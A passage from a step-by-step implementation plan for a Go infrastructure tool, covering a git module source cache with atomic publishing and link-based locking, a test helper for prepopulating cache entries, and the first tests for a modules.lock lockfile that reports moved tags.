#### 13.5 Run them, see them fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/
```

Expect `undefined: NewCache`, `undefined: markerName`, `undefined: Resolution`.

#### 13.6 Minimal code

Create `internal/modules/source/cache.go`:

```go
package source

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/infrata/infrata/internal/diag"
)

const (
	// markerName is written INSIDE a checkout, last, before the checkout is
	// renamed into place. A directory without a valid marker was never
	// published by this code — an interrupted fetch, or something a user
	// put there — and is discarded rather than loaded as a module.
	markerName = ".infra-module"

	defaultLockTimeout = 2 * time.Minute
	lockPollInterval   = 100 * time.Millisecond
)

// Resolution is what a source resolved to.
type Resolution struct {
	// Dir is a directory on disk holding the module.
	Dir string
	// Commit is the commit a git source resolved to, and is empty for a
	// path source: a directory has no commit, and recording one in
	// modules.lock would record something nothing can check.
	Commit string
}

// marker is the JSON written into a published checkout.
type marker struct {
	Version   int       `json:"version"`
	Location  string    `json:"location"`
	Ref       string    `json:"ref"`
	Commit    string    `json:"commit"`
	FetchedAt time.Time `json:"fetched_at"`
}

// Cache turns a Source into a directory on disk, fetching a git source into
// <ProjectDir>/.infra/modules if it is not already there.
type Cache struct {
	ProjectDir  string
	LockTimeout time.Duration
	Git         gitRunner
}

// NewCache returns a cache rooted at a project directory.
func NewCache(projectDir string) *Cache {
	return &Cache{ProjectDir: projectDir}
}

func (c *Cache) root() string { return filepath.Join(c.ProjectDir, ".infra", "modules") }

// checkoutDir is where a git source lives once fetched. It is content
// addressed on the LOCATION so that two sources naming one repository share a
// fetch, with the ref below it so that two refs of one repository coexist.
func (c *Cache) checkoutDir(s Source) string {
	return filepath.Join(c.root(), locationKey(s.Location), refSlug(s.Ref))
}

func (c *Cache) lockPath(s Source) string {
	return filepath.Join(c.root(), locationKey(s.Location), refSlug(s.Ref)+".lock")
}

func locationKey(location string) string {
	sum := sha256.Sum256([]byte(location))
	return hex.EncodeToString(sum[:])[:16]
}

// refSlug keeps the ref readable when it is already one safe path segment, and
// falls back to a hash otherwise: a ref may contain "/" (release/1.0), and a
// nested directory would put the checkout and its lock file at different depths.
func refSlug(ref string) string {
	ok := ref != "" && ref != "." && ref != ".."
	for _, r := range ref {
		switch {
		case 'a' <= r && r <= 'z', 'A' <= r && r <= 'Z', '0' <= r && r <= '9':
		case r == '.', r == '_', r == '-', r == '+':
		default:
			ok = false
		}
	}
	if ok {
		return ref
	}
	sum := sha256.Sum256([]byte(ref))
	return "ref-" + hex.EncodeToString(sum[:])[:16]
}

// Resolve returns a directory holding the module s names, fetching it if
// necessary. baseDir is the directory of the file that declared the source,
// which is what a relative path is relative to.
//
// It WRITES NOTHING outside the cache: no modules.lock, no record of what it
// resolved (Amendment 18). Only stage 5 sees every resolution, including the
// nested ones a fetched module's own module.yml declares, and only a complete
// set can be written in one shot — a lockfile built one entry per call here
// would be readable half-written by anything that looked.
func (c *Cache) Resolve(s Source, baseDir string) (Resolution, diag.Diagnostics) {
	if s.Kind == KindPath {
		return c.resolvePath(s, baseDir)
	}
	return c.resolveGit(s)
}

func (c *Cache) resolvePath(s Source, baseDir string) (Resolution, diag.Diagnostics) {
	dir := filepath.FromSlash(s.Location)
	if !filepath.IsAbs(dir) {
		dir = filepath.Join(baseDir, dir)
	}

	info, err := os.Stat(dir)
	switch {
	case errors.Is(err, fs.ErrNotExist):
		return Resolution{}, one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module source " + strconv.Quote(s.Location) + " does not exist",
			Detail: "A path source is resolved relative to the file that declared it. " +
				strconv.Quote(s.Location) + " was looked for at " + dir + ", and there is nothing there.",
			Action: "Create the directory with a module.yml in it, or correct the path.",
			Origin: s.Origin,
		})
	case err != nil:
		return Resolution{}, one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module source " + strconv.Quote(s.Location) + " cannot be read",
			Detail:   err.Error(),
			Action:   "Check the permissions on " + dir + ".",
			Origin:   s.Origin,
		})
	case !info.IsDir():
		return Resolution{}, one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module source " + strconv.Quote(s.Location) + " is a file",
			Detail:   "A module is a DIRECTORY containing module.yml. " + dir + " is a file.",
			Action:   "Point the source at the directory: " + filepath.Dir(s.Location) + ".",
			Origin:   s.Origin,
		})
	}
	return Resolution{Dir: dir}, nil
}

func (c *Cache) resolveGit(s Source) (Resolution, diag.Diagnostics) {
	ctx := context.Background()

	// Checked before the lock is taken, because the common case is a cache
	// that is already good and no other process in sight.
	if res, ok := c.reusable(ctx, s); ok {
		return res, nil
	}

	release, ds := c.lock(s)
	if ds.HasErrors() {
		return Resolution{}, ds
	}
	defer release()

	// Checked AGAIN under the lock: the process that held it a moment ago
	// was very likely fetching exactly this, and without this second check
	// every queued caller re-fetches what it just waited for.
	if res, ok := c.reusable(ctx, s); ok {
		return res, nil
	}

	return c.fetch(ctx, s)
}

// reusable reports whether the cached checkout can be used as it stands.
//
// For a commit pin the answer never needs the network: a commit names an
// immutable object. For a TAG pin the remote is asked on every run, because a
// tag is mutable and a cache that never re-checks one is a cache that cannot
// see the change Amendment 10b exists to report. ls-remote transfers no
// objects, so the cost is one round trip, not a fetch.
func (c *Cache) reusable(ctx context.Context, s Source) (Resolution, bool) {
	dir := c.checkoutDir(s)
	m, ok := readMarker(dir)
	if !ok || m.Location != s.Location || m.Ref != s.Ref {
		return Resolution{}, false
	}

	if s.PinnedToHash() {
		if !strings.HasPrefix(m.Commit, s.Ref) {
			return Resolution{}, false
		}
		return Resolution{Dir: dir, Commit: m.Commit}, true
	}

	remote, err := c.Git.lsRemoteCommit(ctx, s.Location, s.Ref)
	if err != nil || remote != m.Commit {
		return Resolution{}, false
	}
	return Resolution{Dir: dir, Commit: m.Commit}, true
}

// fetch clones into a temp directory and publishes it with a rename.
//
// The rename is what makes a partially fetched tree impossible to observe:
// stage 5 reads a checkout without taking the lock, so a fetch that wrote into
// the final path directly would be visible half-done for as long as it ran.
func (c *Cache) fetch(ctx context.Context, s Source) (Resolution, diag.Diagnostics) {
	if err := os.MkdirAll(c.root(), 0o755); err != nil {
		return Resolution{}, one(c.ioDiag(s, err))
	}
	tmp, err := os.MkdirTemp(c.root(), ".tmp-")
	if err != nil {
		return Resolution{}, one(c.ioDiag(s, err))
	}
	defer os.RemoveAll(tmp) // a no-op once the rename has succeeded

	commit, err := c.Git.fetchCommit(ctx, tmp, s)
	if err != nil {
		return Resolution{}, one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module source " + strconv.Quote(s.String()) + " could not be fetched",
			Detail:   err.Error(),
			Action: "Check that the repository exists, that " + strconv.Quote(s.Ref) +
				" is a tag or commit in it, and that this machine can authenticate to it without a prompt (a credential helper for https, or an ssh key).",
			Origin: s.Origin,
		})
	}

	if err := writeMarker(tmp, marker{
		Version: 1, Location: s.Location, Ref: s.Ref, Commit: commit, FetchedAt: time.Now().UTC(),
	}); err != nil {
		return Resolution{}, one(c.ioDiag(s, err))
	}

	dir := c.checkoutDir(s)
	// Rename fails with ENOTEMPTY onto a non-empty directory, so the old
	// entry goes first. Both happen under the lock.
	if err := os.RemoveAll(dir); err != nil {
		return Resolution{}, one(c.ioDiag(s, err))
	}
	if err := os.Rename(tmp, dir); err != nil {
		// Another process published while we were fetching — only
		// reachable if locking failed. Its tree is as good as ours.
		if m, ok := readMarker(dir); ok && m.Commit == commit {
			return Resolution{Dir: dir, Commit: commit}, nil
		}
		return Resolution{}, one(c.ioDiag(s, err))
	}
	return Resolution{Dir: dir, Commit: commit}, nil
}

func (c *Cache) ioDiag(s Source, err error) diag.Diagnostic {
	return diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  "the module cache for " + strconv.Quote(s.String()) + " could not be written",
		Detail:   err.Error(),
		Action:   "Check the permissions on " + c.root() + ", or remove it and re-run: it is a cache and can be rebuilt.",
		Origin:   s.Origin,
	}
}
```

And the lock, whose shape follows `internal/state/lock.go` deliberately:

```go
// lock takes the fetch lock for one source, waiting for another process to
// finish rather than failing immediately: the holder is normally a few seconds
// from publishing exactly what this caller wants.
//
// The lock file is created by writing a temp file and hard-linking it into
// place. os.Link fails with EEXIST if the target exists, which is create-or-
// fail, which is exclusivity; os.Rename would OVERWRITE, so two processes would
// both believe they held the lock, both would remove the checkout directory,
// and one would delete the tree the other had just published while stage 5 was
// reading it. internal/state/lock.go makes the same choice for the same reason,
// and local.go's Put uses Rename for the opposite requirement.
//
// Unlike an environment lock, this one EXPIRES by timing out rather than
// waiting forever. An environment lock guards a mutation of the user's real
// infrastructure, where a wrong guess about staleness is unrecoverable; this one
// guards a directory that can be deleted and rebuilt.
func (c *Cache) lock(s Source) (release func(), ds diag.Diagnostics) {
	path := c.lockPath(s)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return func() {}, one(c.ioDiag(s, err))
	}

	timeout := c.LockTimeout
	if timeout <= 0 {
		timeout = defaultLockTimeout
	}
	deadline := time.Now().Add(timeout)

	for {
		err := linkLock(path, fmt.Sprintf(
			"{\"pid\":%d,\"host\":%q,\"location\":%q,\"ref\":%q,\"at\":%q}\n",
			os.Getpid(), hostname(), s.Location, s.Ref, time.Now().UTC().Format(time.RFC3339)))
		if err == nil {
			return func() { os.Remove(path) }, nil
		}
		if !errors.Is(err, fs.ErrExist) {
			return func() {}, one(c.ioDiag(s, err))
		}
		if time.Now().After(deadline) {
			held, _ := os.ReadFile(path)
			return func() {}, one(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "another process is fetching module source " + strconv.Quote(s.String()),
				Detail: "The fetch lock " + path + " was held for longer than " + timeout.String() +
					". It holds: " + strings.TrimSpace(string(held)),
				Action: "Wait for the other run to finish. If no other run is in progress, delete " + path + " — it is a cache lock, and deleting it cannot lose any state.",
				Origin: s.Origin,
			})
		}
		time.Sleep(lockPollInterval)
	}
}

func linkLock(path, content string) error {
	tmp, err := os.CreateTemp(filepath.Dir(path), ".lock-*.tmp")
	if err != nil {
		return err
	}
	name := tmp.Name()
	defer os.Remove(name)

	if err := tmp.Chmod(0o600); err != nil {
		tmp.Close()
		return err
	}
	if _, err := tmp.WriteString(content); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	return os.Link(name, path)
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

func readMarker(dir string) (marker, bool) {
	data, err := os.ReadFile(filepath.Join(dir, markerName))
	if err != nil {
		return marker{}, false
	}
	var m marker
	if err := json.Unmarshal(data, &m); err != nil || m.Version != 1 || m.Commit == "" {
		return marker{}, false
	}
	return m, true
}

func writeMarker(dir string, m marker) error {
	data, err := json.Marshal(m)
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dir, markerName), append(data, '\n'), 0o600)
}
```

`one` is already in `source.go` from Task 11; do not declare a second.

`hostname` duplicates a four-line helper in `internal/state`, which is unexported there.
Copying four lines is the right call over exporting a state helper into a module package —
say so in the commit message rather than leaving a reviewer to wonder whether it was
noticed.

#### 13.6a The one exported way to build a cache entry

Author C's integration suite needs a valid cache entry created before the binary runs, so
that a hash-pinned source resolves without a network (13.6's skip rule). It asked for a
helper rather than recomputing `.infra/modules/<sha256(location)[:16]>/<ref>/` itself, and
it was right to: **a second copy of the layout would keep passing after the layout
changed, and stop testing anything.** A cache miss against `https://example.invalid/repo`
fails looking exactly like an ordinary network error, so the duplicate would fail silently
in the one direction nobody looks.

Create `internal/modules/source/prepopulate.go`:

```go
package source

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// PrepopulateCache creates a cache entry that Resolve accepts without touching
// the network, and is the ONLY supported way to build one from outside this
// package.
//
// It exists for tests in other packages — tests/integration cannot import a
// _test.go file, and a test that recomputed the cache path itself would be a
// second copy of a layout this package is free to change. It takes no
// *testing.T and returns an error, so no production file imports "testing".
//
// The three guards are the point. Every way of misusing this produces a cache
// entry that Resolve silently DISCARDS, after which the source is fetched for
// real and the test fails with what looks like a network error — the one
// failure mode a test author will misread. Each is refused here instead, by
// name.
func PrepopulateCache(projectDir string, s Source, commit string, files map[string]string) error {
	switch {
	case s.Kind != KindGit:
		return fmt.Errorf("prepopulate: %s is a path source and is never cached; point the test at the directory instead", s)

	case !s.PinnedToHash():
		// reusable() runs ls-remote for a tag on EVERY resolve, because a
		// tag is mutable and that check is the whole of the moved-tag
		// detection. A prepopulated tag entry therefore still needs a
		// reachable remote, which is exactly what the caller was avoiding.
		return fmt.Errorf("prepopulate: %s is pinned to a tag, and a tag is re-checked against the remote on every resolve; only a commit pin skips the network", s)

	case len(commit) != 40:
		return fmt.Errorf("prepopulate: commit %q is not a full 40-character hash; the marker records the commit, not an abbreviation of it", commit)

	case !strings.HasPrefix(commit, s.Ref):
		return fmt.Errorf("prepopulate: commit %q does not start with the pinned ref %q, so Resolve would discard this entry as belonging to another commit", commit, s.Ref)
	}

	dir := NewCache(projectDir).checkoutDir(s)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	for rel, body := range files {
		full := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			return err
		}
		if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
			return err
		}
	}

	// Written last, as fetch writes it: a directory without a valid marker
	// is one this code never published.
	return writeMarker(dir, marker{
		Version: 1, Location: s.Location, Ref: s.Ref, Commit: commit, FetchedAt: time.Now().UTC(),
	})
}
```

And the test that makes the helper self-verifying — this is what buys C's suite its
guarantee, because it fails here if the layout moves and the helper is not moved with it:

```go
// TestPrepopulateCacheProducesAnEntryResolveAccepts — add to cache_test.go.
//
// The location is unreachable on purpose. Resolve succeeding against
// example.invalid proves two things at once: the helper writes the entry where
// the cache actually looks, and a commit pin that is already cached skips the
// network entirely. Change the layout without changing the helper and this
// fails — which is the whole reason tests/integration is given a helper instead
// of the path.
func TestPrepopulateCacheProducesAnEntryResolveAccepts(t *testing.T) {
	project := t.TempDir()
	commit := strings.Repeat("a", 40)
	s, ds := Parse("https://example.invalid/repo:"+commit, value.Origin{})
	if ds.HasErrors() {
		t.Fatalf("Parse: %+v", ds)
	}
	if err := PrepopulateCache(project, s, commit, map[string]string{"module.yml": "inputs: {}\n"}); err != nil {
		t.Fatalf("PrepopulateCache: %v", err)
	}

	res, ds := c13(t, project).Resolve(s, project)
	if ds.HasErrors() {
		t.Fatalf("Resolve: %+v — a prepopulated commit pin must resolve with no network at all", ds)
	}
	if res.Commit != commit {
		t.Errorf("Commit = %q, want %q", res.Commit, commit)
	}
	if _, err := os.Stat(filepath.Join(res.Dir, "module.yml")); err != nil {
		t.Errorf("the prepopulated module.yml is not in the resolved directory: %v", err)
	}
}

// TestPrepopulateCacheRefusesWhatResolveWouldDiscard. Each of these produces an
// entry Resolve throws away, after which the test that used it fails with a
// network error and the author looks in the wrong place.
func TestPrepopulateCacheRefusesWhatResolveWouldDiscard(t *testing.T) {
	project := t.TempDir()
	commit := strings.Repeat("a", 40)

	tag, _ := Parse("https://example.invalid/repo:v1.0.0", value.Origin{})
	if err := PrepopulateCache(project, tag, commit, nil); err == nil {
		t.Error("a tag pin was accepted; a tag is re-checked against the remote on every resolve, so the entry would not have skipped the network")
	}

	hash, _ := Parse("https://example.invalid/repo:"+commit, value.Origin{})
	if err := PrepopulateCache(project, hash, strings.Repeat("b", 40), nil); err == nil {
		t.Error("a commit that does not match the pin was accepted; Resolve would discard the entry as another commit's")
	}
	if err := PrepopulateCache(project, hash, commit[:7], nil); err == nil {
		t.Error("an abbreviated commit was accepted")
	}
	if err := PrepopulateCache(project, Source{Kind: KindPath, Location: "./m"}, commit, nil); err == nil {
		t.Error("a path source was accepted")
	}
}
```

`prepopulate.go` joins Task 13's commit paths.

#### 13.7 Run them, see them pass

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/
go test -count=1 -race ./internal/modules/source/
go vet ./internal/modules/source/ && gofmt -l internal/modules/source/
```

#### 13.8 Sabotage

| Sabotage | Must fail |
|----------|-----------|
| In `reusable`, return early for a tag pin without calling `lsRemoteCommit` | `TestResolveChecksATagPinAgainstTheRemoteEveryTime` and `TestResolveFollowsATagThatMoved` |
| In `reusable`, call `lsRemoteCommit` for a hash pin too | `TestResolveDoesNotFetchAHashPinThatIsAlreadyCached` |
| Drop the `readMarker` check and reuse any existing directory | `TestResolveReplacesAnInterruptedCheckout` |
| Drop the `strings.HasPrefix(m.Commit, s.Ref)` check | `TestResolveReplacesACheckoutWhoseMarkerNamesAnotherCommit` |
| Replace `os.Link` with `os.Rename` in `linkLock` | `TestResolveWaitsForAnotherProcessAndGivesUpWithADiagnostic` — the lock is stolen and Resolve proceeds |
| Fetch into `checkoutDir` directly and drop the rename | nothing in this suite fails reliably, and that is worth knowing: the torn-tree window is real but narrow, and `TestResolveIsSafeWhenCallersRace` only samples it. **Do not conclude the rename is unnecessary** — conclude that this is one of the two places in these tasks where the test is weaker than the requirement, and leave the comment in `fetch` saying why the rename is there |

#### 13.9 Commit

```bash
git add internal/modules/source/cache.go internal/modules/source/cache_test.go internal/modules/source/prepopulate.go
git commit -m "Add the module source cache, its lock and its skip rules

.infra/modules/<sha256(location)[:16]>/<ref>/ holds a checkout, published by
renaming a temp directory into place so a partially fetched tree is never
visible under its final name, and marked with a .infra-module file written last
so an interrupted fetch is discarded rather than loaded.

The fetch lock is created with os.Link, matching internal/state/lock.go: Link
fails if the target exists, which is exclusivity, where Rename would overwrite
and let two fetchers both believe they held it. Unlike an environment lock it
times out, because it guards a rebuildable cache rather than a mutation of real
infrastructure.

A commit pin that is already cached skips the network entirely. A TAG pin runs
ls-remote on every resolve, because a tag is mutable and a cache that never
re-checks one cannot see the change modules.lock exists to report.

PrepopulateCache is the one supported way to build a cache entry from another
package's tests: tests/integration cannot import a _test.go file, and a test
recomputing the cache path itself would be a second copy of a layout this
package is free to change — one that keeps passing after the layout moves,
because a cache miss looks like an ordinary network error.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" -- internal/modules/source/cache.go internal/modules/source/cache_test.go internal/modules/source/prepopulate.go
```

---

---

## Task 14 — `modules.lock` and the moved-tag report

### Why this task exists

**Amendment 10b: a tag is mutable, so the commit it resolved to is recorded, and a later
disagreement is a REPORTED change.** Pinning by tag without recording the hash gives the
appearance of determinism without the property — a plan that is stable run to run only
because nobody looked at what moved underneath it.

**What this task owns is the FORMAT, the atomic write, the comparison, and the
diagnostic. What it does not own is when the write happens and with what** — Amendment 18
puts that in stage 5, for two reasons. Stage 5 is the only component that sees every
resolution, because a nested module's `modules:` list lives inside its own `module.yml`
and is unknowable until that module has been loaded. And a lockfile written one entry per
`Resolve` call is observable half-written: if the walk then fails on a cycle, a depth
bound or a refused source, the file records half a resolution as though it were complete.
That is the shape of the M4 lock-file bug (`ae1e309`) — a file created and populated in
two steps, readable by anything in between — fixed once in `internal/state/lock.go`, and
it must not reappear in a new artifact.

So this is the last piece of the package, and the wiring that makes it reachable — stage 2
calling `Parse`, stage 5 calling `Resolve`, `Check` and `WriteLockfile`, and the deletion
of stage 5's "remote sources are not built yet" guard **in the same commit as the
`Resolve` call** — belongs to Authors A and B and is written down in "The consumer
contract" at the top of this file. It is not here because when these tasks run, neither
package exists in the shape that wiring needs.

### Files

| Action | Path |
|--------|------|
| create | `internal/modules/source/lockfile.go` |
| create | `internal/modules/source/lockfile_test.go` |
| modify | `internal/modules/source/cache.go` (recording, containment) |
| modify | `internal/modules/source/cache_test.go` (containment test) |

Nothing outside `internal/modules/source/`. The `CLAUDE.md` entry and the integration
tests this package's behaviour deserves are in the appendix, owed by the task that lands
the wiring: **a user-facing capability is documented in the change that makes it
reachable**, and documenting it here would describe something no command can do yet.

### Interfaces

**Produces:**

```go
// Record is one line of modules.lock.
type Record struct {
    Source string `json:"source"`
    Ref    string `json:"ref"`
    Commit string `json:"commit"`
}

// Lockfile is modules.lock: what each remote source resolved to last time.
type Lockfile struct {
    Version int      `json:"version"`
    Modules []Record `json:"modules"` // sorted by (Source, Ref)
}

// Pin is the lockfile entry a resolution produces, if it has one.
func Pin(s Source, res Resolution) (Record, bool)

// LoadLockfile reads modules.lock; a missing file is not an error.
func LoadLockfile(projectDir string) (Lockfile, diag.Diagnostics)

// Check compares one resolution against the record. It is a PURE READ.
func (lf *Lockfile) Check(rec Record, origin value.Origin) diag.Diagnostics

// WriteLockfile persists a complete set of resolutions, in one call.
func WriteLockfile(projectDir string, records []Record) diag.Diagnostics
```

**Three free functions and a method, and no new method on `Cache`** — Amendment 18.
`Cache.Resolve` returns a `Resolution` and writes nothing; stage 5 collects them, and
`Expansion` carries them. The three semantics, in the order they bite:

| The entry is | Then |
|--------------|------|
| absent | not a mismatch. Written by `WriteLockfile` after a successful walk, once |
| present, same ref, same commit | left alone |
| present, same ref, **different commit** | **an ERROR, never an update.** The ref moved, or the lockfile or cache was tampered with. A lockfile that adopts what it finds records history and enforces nothing — the appearance of pinning without the property, inside the feature built to prevent that |
| present for this source under a **different ref** | not a mismatch either. The user edited the pin, and telling them their own deliberate edit is an error is worse than useless |

**The comparison is keyed on `(source, ref)`, not on source alone** (Amendment 20c), and
that one decision is the difference between the three rows above and a tool that refuses
every version bump. Keying on the source alone would make `:v1.0` → `:v2.0` resolve to a
commit that differs from the record and report it as a moved tag — for a change the user
had just typed. 14.2b is the test; the sabotage is a one-line change to the key, and it is
the plausible one, because "one entry per module source" reads perfectly natural.

**Every `KindGit` source gets an entry, hash pins included.** A commit cannot move, so the
entry can never fire on its own; it costs one line and excluding it would hole the
mechanism — a tampered cache or an abbreviated hash that resolved differently would go
unreported, and the whole thing would be untestable without a live remote.

`Check` writing nothing is what makes the third row compatible with `infra validate`
reporting a moved tag: a command that answers a question about a project must not mutate
it, and the only thing standing between those two is that the comparison is a pure read.

### Steps

#### 14.1 Failing test: the comparison is a pure read

Create `internal/modules/source/lockfile_test.go`:

```go
package source

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/infrata/infrata/pkg/value"
)

func writeLockfileFixture(t *testing.T, project string, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(project, "modules.lock"), []byte(body), 0o644); err != nil {
		t.Fatalf("write modules.lock: %v", err)
	}
}

func readLockfile(t *testing.T, project string) Lockfile {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(project, "modules.lock"))
	if err != nil {
		t.Fatalf("reading modules.lock: %v", err)
	}
	var lf Lockfile
	if err := json.Unmarshal(data, &lf); err != nil {
		t.Fatalf("modules.lock is not valid JSON: %v\n%s", err, data)
	}
	return lf
}

// TestCheckIsAPureRead is the assertion Amendment 18 turns on. `infra validate`
// answers a question about a project and must not mutate it, and the only thing
// standing between those two is that Check writes nothing at all. A comparison
// that "helpfully" records what it saw would make validate a writer.
//
// Delete the pure-read property — have Check persist an absent entry — and this
// fails.
func TestCheckIsAPureRead(t *testing.T) {
	project := t.TempDir()
	lf, ds := LoadLockfile(project)
	if ds.HasErrors() {
		t.Fatalf("LoadLockfile on a project with no lockfile: %+v", ds)
	}

	rec := Record{Source: "https://example.invalid/repo", Ref: "v1.0.0", Commit: strings.Repeat("a", 40)}
	if ds := lf.Check(rec, value.Origin{}); ds.HasErrors() {
		t.Fatalf("Check on an absent entry reported %+v; an entry nobody has recorded yet is not a mismatch", ds)
	}

	entries, err := os.ReadDir(project)
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	for _, e := range entries {
		t.Errorf("Check created %q; it must write nothing, or `infra validate` becomes a command that mutates the project it is reporting on", e.Name())
	}
}

func TestCheckIsSilentWhenTheEntryMatches(t *testing.T) {
	project := t.TempDir()
	commit := strings.Repeat("a", 40)
	writeLockfileFixture(t, project, `{"version":1,"modules":[{"source":"https://example.invalid/repo","ref":"v1.0.0","commit":"`+commit+`"}]}`)

	lf, ds := LoadLockfile(project)
	if ds.HasErrors() {
		t.Fatalf("LoadLockfile: %+v", ds)
	}
	if ds := lf.Check(Record{Source: "https://example.invalid/repo", Ref: "v1.0.0", Commit: commit}, value.Origin{}); ds.HasErrors() {
		t.Errorf("Check reported %+v for an entry that matches", ds)
	}
}

// TestLoadLockfileRefusesAVersionItDoesNotUnderstand: guessing at a file this
// build cannot read would mean comparing against something whose meaning is
// unknown, which is worse than stopping.
func TestLoadLockfileRefusesAVersionItDoesNotUnderstand(t *testing.T) {
	project := t.TempDir()
	writeLockfileFixture(t, project, `{"version":2,"modules":[]}`)
	if _, ds := LoadLockfile(project); !ds.HasErrors() {
		t.Error("LoadLockfile accepted a version 2 file")
	}
}
```

#### 14.2 Failing test: a mismatch is an ERROR, never an update

```go
// TestCheckReportsAMovedTagAndNeverAdoptsIt is Amendment 10b's whole point and
// Amendment 18's third semantic. A lockfile that silently adopts whatever it
// finds records history and enforces nothing — the appearance of pinning
// without the property, inside the feature built to prevent exactly that.
//
// Two assertions, and the second is the one that would be missed: the
// diagnostic, and that the file on disk is UNCHANGED afterwards.
func TestCheckReportsAMovedTagAndNeverAdoptsIt(t *testing.T) {
	project := t.TempDir()
	was := strings.Repeat("a", 40)
	now := strings.Repeat("b", 40)
	body := `{"version":1,"modules":[{"source":"https://example.invalid/repo","ref":"v1.0.0","commit":"` + was + `"}]}`
	writeLockfileFixture(t, project, body)

	lf, ds := LoadLockfile(project)
	if ds.HasErrors() {
		t.Fatalf("LoadLockfile: %+v", ds)
	}

	origin := value.Origin{File: "infra.yml", Line: 3, Column: 5}
	ds = lf.Check(Record{Source: "https://example.invalid/repo", Ref: "v1.0.0", Commit: now}, origin)
	if !ds.HasErrors() {
		t.Fatal("a tag that moved was accepted silently")
	}

	var sb strings.Builder
	ds.Render(&sb)
	got := sb.String()
	for _, want := range []string{"v1.0.0", was, now, "modules.lock", "infra.yml:3:5", "Suggested action:"} {
		if !strings.Contains(got, want) {
			t.Errorf("diagnostic does not mention %q — a report that does not name both commits cannot be acted on:\n%s", want, got)
		}
	}
	// The action must work with the commands this milestone ships. There is
	// no `infra modules update` and no --upgrade flag in M5.
	if strings.Contains(got, "infra modules") || strings.Contains(got, "--upgrade") {
		t.Errorf("the action names a surface this milestone does not have:\n%s", got)
	}

	after, err := os.ReadFile(filepath.Join(project, "modules.lock"))
	if err != nil {
		t.Fatalf("reading modules.lock: %v", err)
	}
	if string(after) != body {
		t.Errorf("modules.lock changed during a comparison:\n%s\nwant it byte-identical: a lockfile that adopts what it finds enforces nothing", after)
	}
}

// TestTheDocumentedRemedyWorks: the action tells the user to delete the entry
// and re-run. If that does not actually clear the error, the diagnostic is
// giving instructions that fail.
func TestTheDocumentedRemedyWorks(t *testing.T) {
	project := t.TempDir()
	now := strings.Repeat("b", 40)
	writeLockfileFixture(t, project, `{"version":1,"modules":[]}`)

	lf, ds := LoadLockfile(project)
	if ds.HasErrors() {
		t.Fatalf("LoadLockfile: %+v", ds)
	}
	if ds := lf.Check(Record{Source: "https://example.invalid/repo", Ref: "v1.0.0", Commit: now}, value.Origin{}); ds.HasErrors() {
		t.Errorf("with the entry removed, the comparison still fails: %+v", ds)
	}
}
```

#### 14.2b Failing test: bumping a pin is a new entry, not a mismatch

```go
// TestBumpingAPinIsANewEntryNotAMismatch is Amendment 20c, and it is the case
// that separates a lockfile from an obstruction.
//
// A user editing `:v1.0` to `:v2.0` has made a deliberate change and gets a
// commit that differs from what the lockfile records. Keyed on the source
// alone, that reads as a moved tag and the tool tells them to delete an entry
// to permit an edit they just made. Keyed on (source, ref) — which is what the
// record already carries — it is simply a pin this project has not seen before.
//
// The sabotage is one line: key on rec.Source instead of rec.Source + ref. It
// is the plausible mistake, because "one entry per module source" reads
// perfectly natural, and nothing else in the suite catches it.
func TestBumpingAPinIsANewEntryNotAMismatch(t *testing.T) {
	project := t.TempDir()
	const src = "https://example.invalid/repo"
	oldCommit := strings.Repeat("a", 40)
	newCommit := strings.Repeat("b", 40)
	writeLockfileFixture(t, project, `{"version":1,"modules":[{"source":"`+src+`","ref":"v1.0","commit":"`+oldCommit+`"}]}`)

	lf, ds := LoadLockfile(project)
	if ds.HasErrors() {
		t.Fatalf("LoadLockfile: %+v", ds)
	}

	bumped := Record{Source: src, Ref: "v2.0", Commit: newCommit}
	if ds := lf.Check(bumped, value.Origin{}); ds.HasErrors() {
		var sb strings.Builder
		ds.Render(&sb)
		t.Fatalf("editing the pin from v1.0 to v2.0 was reported as a problem:\n%s", sb.String())
	}

	// And the walk that follows replaces the file with what the
	// configuration now says: the v1.0 entry is gone because it was not
	// resolved, not because anything deleted it.
	if ds := WriteLockfile(project, []Record{bumped}); ds.HasErrors() {
		t.Fatalf("WriteLockfile: %+v", ds)
	}
	after := readLockfile(t, project)
	if len(after.Modules) != 1 || after.Modules[0] != bumped {
		t.Errorf("modules = %+v, want only %+v", after.Modules, bumped)
	}
}

// TestAHashPinnedSourceIsRecordedAndChecked. A commit cannot move, so this
// entry can never fire on its own — which is an argument for writing it, not
// against: a tampered cache or an abbreviated hash that resolved differently is
// otherwise unreported, and the mechanism would be untestable without a live
// remote.
func TestAHashPinnedSourceIsRecordedAndChecked(t *testing.T) {
	project := t.TempDir()
	const src = "https://example.invalid/repo"
	commit := strings.Repeat("a", 40)

	rec, ok := Pin(Source{Kind: KindGit, Location: src, Ref: commit}, Resolution{Dir: "/tmp/x", Commit: commit})
	if !ok {
		t.Fatal("Pin skipped a hash-pinned source; every KindGit source gets an entry")
	}
	if ds := WriteLockfile(project, []Record{rec}); ds.HasErrors() {
		t.Fatalf("WriteLockfile: %+v", ds)
	}

